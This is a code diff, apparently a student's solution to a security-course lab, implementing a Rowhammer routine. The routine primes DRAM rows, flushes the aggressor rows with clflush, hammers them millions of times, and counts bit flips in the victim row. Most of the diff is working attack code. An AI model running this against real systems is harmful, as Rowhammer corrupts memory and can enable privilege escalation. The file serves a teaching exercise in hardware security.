@@ -3,12 +3,12 @@
 #include "../params.hh"
 #include "../util.hh"
 
-// TODO: Candidate id derived in part3
 #define BANK_FUNC_CAND 0
 
 // TODO: Try different combinations of these parameters to find the best ones for the machine!
-#define VIC_DATA 0x00
-#define AGG_DATA 0xff 
+#define VIC_DATA 0xff
+#define AGG_DATA 0x00 
+#define HAMMER_COUNT 5000000
 
 #define NUM_HAMMER_ATTEMPTS 100
 
@@ -24,22 +24,55 @@ char *dram_to_str(uint64_t phys_ptr);
  * Input: victim address, and two attacker addresses (all *physical*)
  * Output: True if any bits have been flipped, false otherwise.
  *
- */
+*/
 uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t hp_base) {
-                      
     uint64_t foundFlips = 0;
-    // TODO: Exercise 4-1
+    // Exercise 4-1
+    
+    // Prime
+    memset((void*)attA, AGG_DATA, ROW_STRIDE);
+    memset((void*)attB, AGG_DATA, ROW_STRIDE); 
+    memset((void*)vict, VIC_DATA, ROW_STRIDE);
+    
+    // Flush attA and attB from cache
+    for (uint64_t i = 0; i < ROW_STRIDE; i += CACHELINE_SIZE) {
+        clflush((volatile char*)(attA + i));
+        clflush((volatile char*)(attB + i));
+    }
+    mfence();
+
+    // Hammer
+    volatile char *pA = (volatile char*)attA;
+    volatile char *pB = (volatile char*)attB;
+    
+    // Access, flush, repeat
+    for (uint64_t h = 0; h < HAMMER_COUNT; h++) {
+	*pA;
+        clflush(pA);
+        *pB;
+        clflush(pB);
+        mfence();
+    }
+ 
+    // Probe
+    uint64_t vict_row_base = vict & ~((uint64_t)ROW_STRIDE - 1);
+
+    for (uint64_t i = 0; i < ROW_STRIDE; i++) {
+        uint8_t val = *((volatile uint8_t*)(vict_row_base + i));
+        if (val != VIC_DATA) {
+            foundFlips++;
+        }
+    }    
+    
     return foundFlips; 
 }
+
 
 /*
  *
  * DO NOT MODIFY BELOW ME
  *
- */
-
-
-
+*/
 int main(int argc, char** argv) {
     srand(time(NULL));
     setvbuf(stdout, NULL, _IONBF, 0);
